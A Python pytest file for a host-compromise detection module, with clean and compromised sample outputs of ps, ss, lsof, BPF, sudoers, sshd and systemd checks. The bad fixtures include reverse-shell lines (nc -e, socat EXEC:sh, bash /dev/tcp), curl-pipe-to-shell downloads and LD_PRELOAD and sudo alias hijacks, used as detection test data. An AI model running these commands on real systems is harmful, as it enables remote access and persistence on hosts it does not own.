import json
from pathlib import Path

import pytest

from modules import hostscan
from shellcraft.modkit import ModuleError

MD = Path(__file__).resolve().parent.parent / "modules" / "hostscan.md"

PS_CLEAN = """# sshrun web01 ps (untrusted remote output)
    1     0 root                    99999 /sbin/init splash
    2     0 root                    99999 [kthreadd]
  812     1 root                     5000 sshd: /usr/sbin/sshd -D [listener]
  900   812 bob                      4000 -bash
 1500   900 bob                        20 ps -eo pid=,ppid=,user:20=,etimes=,args=
 2000     1 root                      300 nginx: master process /usr/sbin/nginx
 2001  2000 www-data                  299 nginx: worker process
"""
PS_BAD = PS_CLEAN + """ 2002  2000 www-data                   60 sh -c id
 2003  2000 www-data                   50 python3 -c import pty
 1203   900 bob                       200 nc -e /bin/sh 203.0.113.9 4444
 1204   812 bob                        10 socat TCP:203.0.113.9:80 EXEC:sh
 3000     1 root                       90 /tmp/.hidden/miner -o pool
 3001     1 root                       80 python3 /dev/shm/run.py
"""
SS_CLEAN = """tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:* users:(("sshd",pid=812,fd=3))
tcp LISTEN 0 511 *:443 *:* users:(("nginx",pid=2000,fd=6))
tcp LISTEN 0 4096 [::]:80 [::]:* users:(("nginx",pid=2000,fd=7))
tcp LISTEN 0 128 127.0.0.1:8123 0.0.0.0:*
udp UNCONN 0 0 127.0.0.53%lo:53 0.0.0.0:*
tcp ESTAB 0 0 10.0.0.5:22 203.0.113.9:51022 users:(("sshd",pid=900,fd=4))
tcp ESTAB 0 0 10.0.0.5:51000 93.184.216.34:443
"""
SS_BAD = SS_CLEAN + """tcp LISTEN 0 1 0.0.0.0:4444 0.0.0.0:* users:(("nc",pid=1203,fd=3))
tcp ESTAB 0 0 10.0.0.5:4444 203.0.113.9:51022 users:(("nc",pid=1203,fd=4))
tcp ESTAB 0 0 10.0.0.5:40000 198.51.100.7:4444 users:(("bash",pid=900,fd=2))
tcp ESTAB 0 0 10.0.0.5:40001 198.51.100.8:9001 users:(("tor",pid=77,fd=2))
tcp ESTAB 0 0 10.0.0.5:40002 198.51.100.9:44444 users:(("bash",pid=900,fd=5))
""" + "".join(f"tcp ESTAB 0 0 10.0.0.5:80 192.0.2.99:{50000 + i}\n" for i in range(20))
# Layouts captured from ps, netstat, lsof and ss on a Linux host, trimmed, with names and addresses replaced.
PS_EF_CLEAN = """UID          PID    PPID  C STIME TTY          TIME CMD
root           1       0  0 Oct07 ?        00:00:43 /usr/lib/systemd/systemd --switched-root --system --deserialize=57
root           2       0  0 Oct07 ?        00:00:01 [kthreadd]
root           4       2  0 Oct07 ?        00:00:00 [kworker/R-rcu_gp]
root         812       1  0 Oct07 ?        00:00:02 sshd: /usr/sbin/sshd -D [listener]
bob          900     812  0 10:15 pts/0    00:00:00 -bash
root        2000       1  0 Oct07 ?        00:00:05 nginx: master process /usr/sbin/nginx
www-data    2001    2000  0 Oct07 ?        1-02:03:04 nginx: worker process
"""
PS_EF_BAD = PS_EF_CLEAN + """www-data    2002    2000  0 10:20 ?        00:00:00 sh -c id
bob         1203     900  0 10:21 pts/0    00:00:00 nc -e /bin/sh 203.0.113.9 4444
bob         1204     812  0 10:22 ?        00:00:00 socat TCP:203.0.113.9:80 EXEC:sh
root        3000       1  9 Oct07 ?        03:10:11 /tmp/.hidden/miner -o pool
"""
PS_AUX_CLEAN = """USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0  43504 13300 ?        Ss   Oct07   0:43 /usr/lib/systemd/systemd --switched-root --system
root           2  0.0  0.0      0     0 ?        S    Oct07   0:01 [kthreadd]
root         812  0.0  0.1  15432  9120 ?        Ss   Oct07   0:02 sshd: /usr/sbin/sshd -D [listener]
bob          900  0.0  0.0   8812  5300 pts/0    Ss   10:15   0:00 -bash
"""
PS_AUX_BAD = PS_AUX_CLEAN + """root        3000 99.0  2.0 123456 20000 ?        Rl   Oct07 190:11 /tmp/.hidden/miner -o pool
bob         3001  0.0  0.0  22000  4000 pts/0    S    10:30   0:00 python3 /dev/shm/run.py
"""
NETSTAT_CLEAN = """Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      812/sshd: /usr/sbin
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      2000/nginx: master
tcp        0      0 10.0.0.5:22             203.0.113.9:51022       ESTABLISHED 900/sshd: bob@pts/0
tcp        0      0 10.0.0.5:51000          93.184.216.34:443       TIME_WAIT   -
tcp6       0      0 :::22                   :::*                    LISTEN      812/sshd: /usr/sbin
tcp6       0      0 ::1:631                 :::*                    LISTEN      -
udp        0      0 127.0.0.53:53           0.0.0.0:*                           414/systemd-resolve
udp        0      0 10.0.0.5:68             10.0.0.1:67             ESTABLISHED 500/NetworkManager
udp6       0      0 [::]:123                [::]:*                              -
"""
NETSTAT_BAD = NETSTAT_CLEAN + """tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      1203/x
tcp        0      0 10.0.0.5:4444           203.0.113.9:51022       ESTABLISHED 1203/nc
tcp        0      0 10.0.0.5:40000          198.51.100.7:4444       ESTABLISHED 900/bash
tcp        0      0 10.0.0.5:40002          198.51.100.9:44444      ESTABLISHED 900/bash
tcp6       0      0 :::6667                 :::*                    LISTEN      1204/socat
""" + "".join(f"tcp        0      0 10.0.0.5:80             192.0.2.99:{50000 + i}      ESTABLISHED -\n" for i in range(20))
NETSTAT_NO_PID = """Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN
udp        0      0 0.0.0.0:68              0.0.0.0:*
"""
LSOF_CLEAN = """COMMAND     PID     USER   FD   TYPE   DEVICE SIZE/OFF NODE NAME
sshd        812     root    3u  IPv4    20123      0t0  TCP *:22 (LISTEN)
sshd        812     root    4u  IPv6    20125      0t0  TCP *:22 (LISTEN)
nginx      2000     root    6u  IPv4    30001      0t0  TCP *:443 (LISTEN)
sshd        900      bob    4u  IPv4    40001      0t0  TCP 10.0.0.5:22->203.0.113.9:51022 (ESTABLISHED)
curl       4000      bob    5u  IPv4    50001      0t0  TCP 10.0.0.5:51000->93.184.216.34:443 (ESTABLISHED)
chrome     4100      bob   30u  IPv6    60001      0t0  TCP [2001:db8::5]:49584->[2001:db8:400::347]:443 (CLOSE_WAIT)
avahi       500    avahi   12u  IPv4    70001      0t0  UDP *:123
wsdd      18018     bob     9u  IPv4    80001      0t0  UDP *:49835
"""
LSOF_BAD = LSOF_CLEAN + """nc         1203      bob    3u  IPv4    90001      0t0  TCP *:4444 (LISTEN)
nc         1203      bob    4u  IPv4    90002      0t0  TCP 10.0.0.5:4444->203.0.113.9:51022 (ESTABLISHED)
bash        900      bob    2u  IPv4    90003      0t0  TCP 10.0.0.5:40000->198.51.100.7:4444 (ESTABLISHED)
bash        900      bob    5u  IPv4    90004      0t0  TCP 10.0.0.5:40002->198.51.100.9:44444 (ESTABLISHED)
""" + "".join(f"nginx      2000     root   9u  IPv4  {95000 + i}      0t0  TCP 10.0.0.5:80->192.0.2.99:{50000 + i} (ESTABLISHED)\n"
              for i in range(20))
LSOF_GENERAL_CLEAN = """COMMAND     PID USER   FD      TYPE             DEVICE SIZE/OFF     NODE NAME
bash        900  bob  cwd       DIR              253,1     4096  1572865 /home/bob
bash        900  bob  rtd       DIR              253,1     4096        2 /
bash        900  bob  txt       REG              253,1  1396520  1049001 /usr/bin/bash
bash        900  bob  mem       REG              253,1    51712  1049770 /usr/lib64/libnss_files-2.38.so
bash        900  bob    0u      CHR              136,0      0t0        3 /dev/pts/0
dbus-brok  3737  bob   14u      REG                0,1  2097152     7179 /memfd:dbus-broker-log (deleted)
"""
LSOF_GENERAL_BAD = LSOF_GENERAL_CLEAN + """x          1203  bob  txt       REG              253,1    10240  2200001 /tmp/x (deleted)
y          1204  bob  txt       REG                0,1    10240     7180 /memfd:payload (deleted)
miner      3000 root  txt       REG              253,1    10240  2200002 /var/tmp/.m/miner
nginx      2000 root  mem       REG              253,1    10240  2200003 /home/bob/libdeleted.so.1 (deleted)
nginx      2000 root  mem       REG              253,1    10240  2200004 /tmp/inject.so
app        5000 root    7w      REG              253,1  1048576  2200005 /var/log/app.log (deleted)
"""
BPF_TEXT_CLEAN = """3: tracing  name dump_bpf_prog  tag aabbccddeeff0011  gpl
\tloaded_at 2026-11-01T10:00:00+0000  uid 0
\txlated 100B  jited 80B  memlock 4096B
\tpids systemd(1)
4: lsm  name restrict  tag 1122334455667788  gpl
\tloaded_at 2026-11-01T10:00:01+0000  uid 0
\txlated 200B  jited 150B  memlock 4096B  map_ids 2
\tbtf_id 44
\tpids agent(9)
"""
BPF_TEXT_BAD = BPF_TEXT_CLEAN + """10: kprobe  name hook_getdents  tag 99aabbccddeeff00  gpl
\tloaded_at 2026-11-01T10:01:40+0000  uid 0
\txlated 300B  jited 210B  memlock 4096B  map_ids 20,21
\tpids evil(1203)
11: kprobe  tag 0011223344556677
\tloaded_at 2026-11-01T10:01:41+0000  uid 0
\txlated 64B  jited 50B  memlock 4096B
12: tracepoint  name trace_exec  tag 8899aabbccddeeff  gpl
\tloaded_at 2026-11-01T10:01:42+0000  uid 0
\tpids falco(500), bash(77)
14: xdp  name filt  tag 1111222233334444  gpl
\tloaded_at 2026-11-01T10:01:44+0000  uid 0
\tpids mystery(600)
16: tracing  name orphan  tag 3333444455556666  gpl
\tloaded_at 2026-11-01T10:01:46+0000  uid 0
"""
EXES_CLEAN = "# sshrun web01 exes\n1 /usr/lib/systemd/systemd\n2\n812 /usr/sbin/sshd\n"
EXES_BAD = "1203 /tmp/x (deleted)\n1204 /memfd:payload (deleted)\n3000 /var/tmp/.m/miner\n812 /usr/sbin/sshd (deleted)\n"
MAPS_CLEAN = """55d0c0000000-55d0c0010000 r--p 00000000 fd:01 1234 /usr/sbin/sshd
55d0c0010000-55d0c0050000 r-xp 00010000 fd:01 1234 /usr/sbin/sshd
7f1000000000-7f1000150000 r-xp 00000000 fd:01 99 /usr/lib/x86_64-linux-gnu/libc.so.6
7f1000200000-7f1000210000 rw-p 00000000 00:00 0
7ffd1000000-7ffd1020000 rw-p 00000000 00:00 0 [stack]
7ffd1030000-7ffd1034000 r-xp 00000000 00:00 0 [vdso]
7f1000300000-7f1000301000 rw-s 00000000 00:01 5 /dev/zero (deleted)
"""
MAPS_BAD = MAPS_CLEAN + """7f2000000000-7f2000001000 rwxp 00000000 00:00 0
7f2100000000-7f2100001000 rwxp 00000000 fd:01 77 /opt/app/plugin.bin
7f2200000000-7f2200001000 r-xp 00000000 fd:01 78 /tmp/inject.so
7f2300000000-7f2300001000 r-xp 00000000 fd:01 79 /usr/lib/x86_64-linux-gnu/libdeleted.so.1 (deleted)
7f2400000000-7f2400001000 r-xp 00000000 00:01 80 /memfd:x (deleted)
7f2500000000-7f2500001000 r-xp 00000000 fd:01 81 /home/bob/libsneaky.so
"""
BPF_CLEAN = json.dumps([
    {"id": 3, "type": "tracing", "name": "dump_bpf_prog", "tag": "aa", "gpl_compatible": True, "loaded_at": 1700000000,
     "uid": 0, "bytes_xlated": 100, "pids": [{"pid": 1, "comm": "systemd"}]},
    {"id": 4, "type": "lsm", "name": "restrict", "tag": "bb", "loaded_at": 1700000001, "uid": 0,
     "pids": [{"pid": 9, "comm": "agent"}]},
])
BPF_BAD = """## prog
[{"id": 10, "type": "kprobe", "name": "hook_getdents", "tag": "cc", "gpl_compatible": true, "loaded_at": 1700000100,
  "uid": 0, "bytes_xlated": 300, "pids": [{"pid": 1203, "comm": "evil"}]},
 {"id": 11, "type": "kprobe", "tag": "dd", "loaded_at": 1700000101, "uid": 0},
 {"id": 12, "type": "tracepoint", "name": "trace_exec", "tag": "ee", "loaded_at": 1700000102, "uid": 0,
  "pids": [{"pid": 500, "comm": "falco"}]},
 {"id": 13, "type": "cgroup_skb", "name": "egress", "tag": "ff", "loaded_at": 1700000103, "uid": 0,
  "pids": [{"pid": 1, "comm": "systemd"}]},
 {"id": 14, "type": "xdp", "name": "filt", "tag": "11", "loaded_at": 1700000104, "uid": 0,
  "pids": [{"pid": 600, "comm": "mystery"}]},
 {"id": 15, "type": "sched_cls", "name": "pinned", "tag": "22", "loaded_at": 1700000105, "uid": 0},
 {"id": 16, "type": "tracing", "name": "orphan", "tag": "33", "loaded_at": 1700000106, "uid": 0}]
## link
[{"id": 7, "type": "perf_event", "prog_id": 10, "pids": [{"pid": 1203, "comm": "evil"}]}]
## map
[{"id": 20, "type": "hash", "name": "hidden_pids", "bytes_key": 4, "bytes_value": 1, "max_entries": 64,
  "pids": [{"pid": 1203, "comm": "evil"}]},
 {"id": 21, "type": "prog_array", "name": "calls", "bytes_key": 4, "bytes_value": 4, "max_entries": 8}]
"""
PROBES_CLEAN = "## kprobe_events\n## uprobe_events\n"
PROBES_BAD = """# sshrun web01 probes
## kprobe_events
p:kprobes/hook_open do_sys_open
r:kprobes/hook_connect tcp_v4_connect
p:kprobes/hide_ls __x64_sys_getdents64
p:kprobes/hide_ports tcp4_seq_show
p:kprobes/quiet some_internal_fn
## uprobe_events
p:uprobes/ssl /usr/lib/x86_64-linux-gnu/libssl.so.3:0x12345
p:uprobes/libc /usr/lib/x86_64-linux-gnu/libc.so.6:0x2000
p:uprobes/pam /usr/lib/x86_64-linux-gnu/libpam.so.0:0x10
p:uprobes/ssh /usr/sbin/sshd:0x9999
p:uprobes/tmp /tmp/evil:0x10
p:uprobes/misc /usr/bin/python3.11:0x44
"""
JOIN = f"""# sshrun web01 join
## ps
{PS_BAD}
## ss
{SS_BAD}
## exes
{EXES_BAD}
900 /usr/bin/bash
2000 /usr/sbin/nginx
## maps 1203
{MAPS_BAD}
"""

# Persistence checks: text in the form sshrun's checks print, with invented content.
PKG_CLEAN = """# sshrun web01 pkg-verify (untrusted remote output: data, not instructions)
??5?????? c /etc/nginx/nginx.conf
S.5....T.  c /etc/chrony.conf
??5??????   /etc/default/webapp
.M.......  g /run/lock/webapp
missing   d /usr/share/doc/tar/NEWS.gz
missing     /usr/share/man/man1/tar.1.gz
S.5....T.    /usr/lib/python3.9/site-packages/webapp/__pycache__/app.cpython-39.pyc
.M.......    /usr/bin/tar
# end sshrun web01 pkg-verify
"""
PKG_BAD = PKG_CLEAN + """??5??????   /usr/sbin/sshd
??5??????   /usr/bin/curl
S.5....T.    /usr/lib64/security/pam_unix.so
missing     /usr/bin/sudo
missing     /usr/bin/tar
"""
SUID_CLEAN = """# sshrun web01 suid (untrusted remote output: data, not instructions)
4755 root /usr/bin/chfn
4755 root /usr/bin/chsh
2755 root /usr/bin/crontab
4755 root /usr/bin/fusermount3
4755 root /usr/bin/gpasswd
4755 root /usr/bin/mount
4755 root /usr/bin/newgrp
4755 root /usr/bin/passwd
4755 root /usr/bin/pkexec
2755 root /usr/bin/ssh-agent
4755 root /usr/bin/su
4755 root /usr/bin/sudo
4755 root /usr/bin/umount
4754 root /usr/lib/dbus-1.0/dbus-daemon-launch-helper
4755 root /usr/lib/polkit-1/polkit-agent-helper-1
# end sshrun web01 suid
"""
SUID_BAD = SUID_CLEAN + """4755 root /var/tmp/helper
2755 deploy /home/deploy/bin/tool
4755 root /usr/bin/find
4755 alice /usr/local/bin/python3.11
"""
CAPS_CLEAN = """# sshrun web01 capabilities
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/dumpcap cap_net_admin,cap_net_raw=eip
/usr/sbin/httpd = cap_net_bind_service+ep
/usr/bin/newuidmap cap_setuid=ep
/usr/bin/newgidmap = cap_setgid+ep
/usr/bin/trace-helper cap_sys_ptrace=i
"""
CAPS_BAD = CAPS_CLEAN + """/usr/bin/python3.11 cap_setuid=ep
/usr/local/bin/backup = cap_dac_read_search+ep
/opt/tools/helper =ep
/home/alice/bin/newuidmap cap_setuid=ep
"""
LDSO_CLEAN = """# sshrun web01 ld-preload
## /etc/ld.so.preload
## /etc/ld.so.conf.d
# libc default configuration
/usr/local/lib
# Multiarch support
/usr/local/lib/x86_64-linux-gnu
/lib/x86_64-linux-gnu
/usr/lib/x86_64-linux-gnu
/opt/webapp/lib
include /etc/ld.so.conf.d/extra/*.conf
# end sshrun web01 ld-preload
"""
LDSO_BAD = """## /etc/ld.so.preload
# added by the installer
/usr/local/lib/libaudit_helper.so
/dev/shm/.x/libh.so
## /etc/ld.so.conf.d
/usr/local/lib
/tmp/lib
build/lib
"""
UNITS_CLEAN = """# sshrun web01 units (untrusted remote output: data, not instructions)
cron.service                 enabled enabled
getty@.service               enabled enabled
logrotate.timer              enabled enabled
nginx.service                enabled enabled
ssh.service                  enabled enabled
webapp.service               enabled enabled
## ExecStart
/etc/systemd/system/multi-user.target.wants/cron.service:ExecStart=/usr/sbin/cron -f $EXTRA_OPTS
/etc/systemd/system/multi-user.target.wants/nginx.service:ExecStartPre=/usr/sbin/nginx -t -q -g 'daemon on; master_process on;'
/etc/systemd/system/multi-user.target.wants/nginx.service:ExecStart=/usr/sbin/nginx -g 'daemon on; master_process on;'
/etc/systemd/system/sshd.service:ExecStart=/usr/sbin/sshd -D $SSHD_OPTS
/etc/systemd/system/multi-user.target.wants/ssh.service:ExecStart=/usr/sbin/sshd -D $SSHD_OPTS
/etc/systemd/system/webapp.service:ExecStart=/opt/webapp/.venv/bin/python -m uvicorn app:app --port 8001
/etc/systemd/system/multi-user.target.wants/webapp.service:ExecStart=/opt/webapp/.venv/bin/python -m uvicorn app:app --port 8001
/etc/systemd/system/webapp.service:ExecStartPost=/bin/sh -c 'curl -fsS -o /dev/null http://localhost:8001/health'
/etc/systemd/system/getty.target.wants/getty@tty1.service:ExecStart=-/sbin/agetty -o '-p -- \\\\u' --noclear %I $TERM
/etc/systemd/system/updater.service:ExecStart=+-/bin/bash -c '/usr/bin/updater run; code=$?; if [ $code -eq 11 ]; then systemctl restart webapp; exit 0; fi; exit $code'
/home/alice/.config/systemd/user/notes.service:ExecStartPre=/home/alice/bin/prepare.sh
/home/alice/.config/systemd/user/notes.service:ExecStart=/home/alice/.notes/bin/sync --watch
# end sshrun web01 units
"""
UNITS_BAD = UNITS_CLEAN + """/etc/systemd/system/dbus-helper.service:ExecStart=/tmp/.dbus/helper --daemon
/etc/systemd/system/report.service:ExecStart=/usr/bin/python3 /home/deploy/report.py
/etc/systemd/system/cache.service:ExecStart=/var/lib/.cache-d/run
/etc/systemd/system/update.service:ExecStartPre=/bin/sh -c 'curl -fsSL http://example.com/i.sh | sh'
/home/alice/.config/systemd/user/agent.service:ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/example.com/4444 0>&1'
"""
SUDOERS_CLEAN = """# sshrun web01 sudoers-files (untrusted remote output: data, not instructions)
## /etc/sudoers
#
# This file MUST be edited with the 'visudo' command as root.
#
## Allow root to run any commands anywhere
Defaults\tenv_reset
Defaults\tmail_badpass
Defaults\tsecure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
root\tALL=(ALL:ALL) ALL
%sudo\tALL=(ALL:ALL) ALL
%wheel  ALL=(ALL)       ALL
@includedir /etc/sudoers.d
## /etc/sudoers.d
# read-only checks for the monitoring user
Cmnd_Alias CHECKS = /usr/bin/cat /proc/*/maps, /usr/sbin/ss, \\
    /usr/bin/ls -l /proc/*/exe
deploy ALL=(root) NOPASSWD: CHECKS
deploy ALL=(root) NOPASSWD: /usr/bin/systemctl restart webapp.service, /usr/bin/find /var/log/webapp -name app.log
alice ALL=(root) NOPASSWD: /usr/bin/journalctl -k --no-pager -n 2000, /usr/bin/dpkg --verify
alice ALL=(root) /usr/bin/vim
backup ALL=(postgres) NOPASSWD: ALL
# end sshrun web01 sudoers-files
"""
SUDOERS_BAD = """## /etc/sudoers
Defaults !authenticate
ALL ALL=(ALL) NOPASSWD: ALL
## /etc/sudoers.d
deploy ALL=(ALL:ALL) NOPASSWD:ALL
%ops ALL=(root) NOPASSWD: /usr/bin/vim /etc/hosts, /usr/bin/find
alice ALL=(root) /home/alice/bin/fix.sh
"""
SSHD_CLEAN = """# sshrun web01 sshd-config
## sshd_config
Include /etc/ssh/sshd_config.d/*.conf
PermitRootLogin prohibit-password
PasswordAuthentication no
PermitEmptyPasswords no
AuthorizedKeysFile\t.ssh/authorized_keys /etc/ssh/authorized_keys/%u
AuthorizedKeysCommand /usr/bin/sss_ssh_authorizedkeys
AuthorizedKeysCommandUser nobody
UsePAM yes
Subsystem\tsftp\t/usr/lib/openssh/sftp-server
Match Host jump.example.org
    PermitRootLogin yes
## sshd_config.d
PasswordAuthentication no
# end sshrun web01 sshd-config
"""
SSHD_BAD = """## sshd_config
PermitRootLogin=yes
permitemptypasswords yes
AuthorizedKeysCommand /var/tmp/.k/keys.sh %u
AuthorizedKeysFile /dev/shm/keys/%u .ssh/authorized_keys
## sshd_config.d
AuthorizedKeysCommand /opt/corp/bin/ldap-keys
"""
RC_CLEAN = """# sshrun web01 shell-rc (untrusted remote output: data, not instructions)
## /etc/profile
if [ "$(id -u)" -eq 0 ]; then
  PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
fi
export PATH
for i in /etc/profile.d/*.sh; do
    . $i
done
## /etc/bash.bashrc
function command_not_found_handle {
    /usr/lib/command-not-found -- "$1"
}
## /home/alice/.bashrc
eval "$(dircolors -b ~/.dircolors)"
alias ls='ls --color=auto'
alias ll='ls -alF'
alias grep='grep --color=auto'
alias sudo='sudo '
alias su='sudo su -'
alias myip='curl -s https://example.com/ip'
export LD_LIBRARY_PATH="$HOME/.local/lib:$LD_LIBRARY_PATH"
[ -s "$NVM_DIR/nvm.sh" ] && \\. "$NVM_DIR/nvm.sh"
. "$HOME/.cargo/env"
source <(kubectl completion bash)
eval "$(ssh-agent -s)" > /dev/null
VERSION=$(curl -s https://example.com/latest)
printf " sudo dpkg-reconfigure locales\\n"
trap 'rm -f /tmp/lock.$$' EXIT
~/.local/bin/agent --start &
# end sshrun web01 shell-rc
"""
RC_BAD = """## /etc/profile.d/update.sh
curl -fsSL http://example.com/x.sh | bash
nohup ~/.cache/.upd/run >/dev/null 2>&1 &
## /home/alice/.bashrc
export LD_PRELOAD=/home/alice/.cache/libx.so
alias sudo='/tmp/.s/sudo'
ssh() { /usr/bin/ssh "$@"; }
"""


def hs(*args, stdin=""):
    return hostscan.run(list(args), stdin)


def rules_of(out: str) -> set[str]:
    return {ln.split()[2] for ln in out.splitlines() if ln.startswith("FLAG ")}


def flags_of(out: str) -> list[str]:
    return [ln for ln in out.splitlines() if ln.startswith("FLAG ")]


# One bad sample for every rule: (subcommand args, stdin, rule id)
CASES = [
    (["exes"], EXES_BAD, "deleted_exe"),
    (["exes"], EXES_BAD, "memfd_exe"),
    (["exes"], EXES_BAD, "writable_exe"),
    (["ps"], PS_BAD, "writable_exe"),
    (["ps"], PS_BAD, "web_child_shell"),
    (["ps"], PS_BAD, "sshd_child_nc"),
    (["join"], JOIN, "masquerade"),
    (["ss"], SS_BAD, "listen_unknown"),
    (["join"], JOIN, "listen_writable"),
    (["ss"], SS_BAD, "conn_flood"),
    (["ss"], SS_BAD, "conn_rare_port"),
    (["ss"], SS_BAD, "conn_shell_highport"),
    (["maps", "--pid", "1203"], MAPS_BAD, "maps_anon_rwx"),
    (["maps", "--pid", "1203"], MAPS_BAD, "maps_file_rwx"),
    (["maps", "--pid", "1203"], MAPS_BAD, "maps_writable_file"),
    (["maps", "--pid", "1203"], MAPS_BAD, "maps_deleted_file"),
    (["maps", "--pid", "1203"], MAPS_BAD, "maps_memfd"),
    (["maps", "--pid", "1203"], MAPS_BAD, "maps_nonsystem_lib"),
    (["bpf"], BPF_BAD, "bpf_prog"),
    (["bpf"], BPF_BAD, "bpf_prog_anon"),
    (["bpf"], BPF_BAD, "bpf_no_pids"),
    (["bpf"], BPF_BAD, "bpf_link"),
    (["bpf"], BPF_BAD, "bpf_map_name"),
    (["probes"], PROBES_BAD, "kprobe_hook"),
    (["probes"], PROBES_BAD, "kprobe_rootkit"),
    (["probes"], PROBES_BAD, "uprobe_lib"),
    (["probes"], PROBES_BAD, "uprobe_auth"),
    (["probes"], PROBES_BAD, "uprobe_writable"),
    (["probes"], PROBES_BAD, "probe_other"),
    # the same rules from the plain forms an EDR saves
    (["ps"], PS_EF_BAD, "writable_exe"),
    (["ps"], PS_EF_BAD, "web_child_shell"),
    (["ps"], PS_EF_BAD, "sshd_child_nc"),
    (["ps"], PS_AUX_BAD, "writable_exe"),
    (["netstat"], NETSTAT_BAD, "listen_unknown"),
    (["netstat"], NETSTAT_BAD, "conn_flood"),
    (["netstat"], NETSTAT_BAD, "conn_rare_port"),
    (["netstat"], NETSTAT_BAD, "conn_shell_highport"),
    (["lsof"], LSOF_BAD, "listen_unknown"),
    (["lsof"], LSOF_BAD, "conn_flood"),
    (["lsof"], LSOF_BAD, "conn_rare_port"),
    (["lsof"], LSOF_BAD, "conn_shell_highport"),
    (["lsof"], LSOF_GENERAL_BAD, "deleted_exe"),
    (["lsof"], LSOF_GENERAL_BAD, "memfd_exe"),
    (["lsof"], LSOF_GENERAL_BAD, "writable_exe"),
    (["lsof"], LSOF_GENERAL_BAD, "maps_deleted_file"),
    (["lsof"], LSOF_GENERAL_BAD, "maps_writable_file"),
    (["lsof"], LSOF_GENERAL_BAD, "lsof_deleted_file"),
    (["bpf"], BPF_TEXT_BAD, "bpf_prog"),
    (["bpf"], BPF_TEXT_BAD, "bpf_prog_anon"),
    (["bpf"], BPF_TEXT_BAD, "bpf_no_pids"),
    (["pkg-verify"], PKG_BAD, "pkg_binary_changed"),
    (["pkg-verify"], PKG_BAD, "pkg_missing"),
    (["suid"], SUID_BAD, "suid_writable_dir"),
    (["suid"], SUID_BAD, "suid_interpreter"),
    (["capabilities"], CAPS_BAD, "cap_dangerous"),
    (["ld-preload"], LDSO_BAD, "ld_preload_set"),
    (["ld-preload"], LDSO_BAD, "ld_path_writable"),
    (["units"], UNITS_BAD, "unit_writable_exec"),
    (["units"], UNITS_BAD, "unit_download_exec"),
    (["sudoers-files"], SUDOERS_BAD, "sudoers_nopasswd_all"),
    (["sudoers-files"], SUDOERS_BAD, "sudoers_writable_cmd"),
    (["sshd-config"], SSHD_BAD, "sshd_root_login"),
    (["sshd-config"], SSHD_BAD, "sshd_empty_passwords"),
    (["sshd-config"], SSHD_BAD, "sshd_keys_command"),
    (["shell-rc"], RC_BAD, "rc_download_exec"),
    (["shell-rc"], RC_BAD, "rc_ld_preload"),
    (["shell-rc"], RC_BAD, "rc_alias_hijack"),
]


@pytest.mark.parametrize("args, text, rule", CASES, ids=[c[2] + ":" + c[0][0] for c in CASES])
def test_rule_fires(args, text, rule):
    assert rule in rules_of(hs(*args, stdin=text))


def test_every_rule_has_a_case_and_is_documented():
    ids = [r["id"] for r in hostscan.RULES]
    assert len(ids) == len(set(ids))
    assert {c[2] for c in CASES} == set(ids)
    md = MD.read_text()
    for rule in ids:
        assert f"`{rule}`" in md
    for r in hostscan.RULES:
        assert r["severity"] in hostscan.SEVERITIES and r["description"]


@pytest.mark.parametrize("args, text", [
    (["ps"], PS_CLEAN), (["ss"], SS_CLEAN), (["exes"], EXES_CLEAN), (["maps", "--pid", "812"], MAPS_CLEAN),
    (["bpf"], BPF_CLEAN), (["bpf"], "[]"), (["probes"], PROBES_CLEAN),
    (["ps"], PS_EF_CLEAN), (["ps"], PS_AUX_CLEAN), (["netstat"], NETSTAT_CLEAN), (["lsof"], LSOF_CLEAN),
    (["lsof"], LSOF_GENERAL_CLEAN),
    (["pkg-verify"], PKG_CLEAN), (["suid"], SUID_CLEAN), (["capabilities"], CAPS_CLEAN), (["ld-preload"], LDSO_CLEAN),
    (["units"], UNITS_CLEAN), (["sudoers-files"], SUDOERS_CLEAN), (["sshd-config"], SSHD_CLEAN),
    (["shell-rc"], RC_CLEAN),
])
def test_clean_samples_have_no_flags(args, text):
    out = hs(*args, stdin=text)
    assert out.endswith("no flags\n")
    assert "FLAG" not in out


def test_clean_join():
    text = f"## ps\n{PS_CLEAN}\n## ss\n{SS_CLEAN}\n## exes\n1 /usr/lib/systemd/systemd\n812 /usr/sbin/sshd\n900 /usr/bin/bash\n"
    out = hs("join", stdin=text)
    assert out.endswith("no flags\n")
    assert "nginx(2000)" in out  # a listener is a process of interest even without findings


def test_severities_of_specific_findings():
    exes = hs("exes", stdin=EXES_BAD)
    assert "FLAG high deleted_exe 1203: binary deleted from disk: /tmp/x" in exes
    assert "FLAG medium deleted_exe 812" in exes and "package upgrade" in exes
    bpf = hs("bpf", stdin=BPF_BAD)
    assert "FLAG high bpf_prog_anon prog 11 kprobe (unnamed)" in bpf
    assert "FLAG info bpf_prog prog 12 tracepoint trace_exec" in bpf
    assert "FLAG medium bpf_prog prog 14 xdp filt" in bpf
    assert "FLAG info bpf_prog prog 13 cgroup_skb egress" in bpf
    assert "FLAG medium bpf_map_name map 20 hash hidden_pids" in bpf
    assert "calls" not in "".join(flags_of(bpf))
    probes = hs("probes", stdin=PROBES_BAD)
    assert "FLAG high kprobe_rootkit kprobe kprobes/hide_ports" in probes
    assert "FLAG high kprobe_rootkit kprobe kprobes/hide_ls" in probes
    assert "FLAG high uprobe_auth uprobe uprobes/pam" in probes
    assert "FLAG medium uprobe_lib uprobe uprobes/ssl" in probes
    assert "kprobes/quiet" in "".join(flags_of(probes)) and "FLAG info probe_other kprobe kprobes/quiet" in probes
    ss = hs("ss", stdin=SS_BAD)
    assert "FLAG high conn_rare_port" in ss and "198.51.100.7:4444" in ss
    assert "FLAG medium conn_rare_port tcp 10.0.0.5:40001" in ss
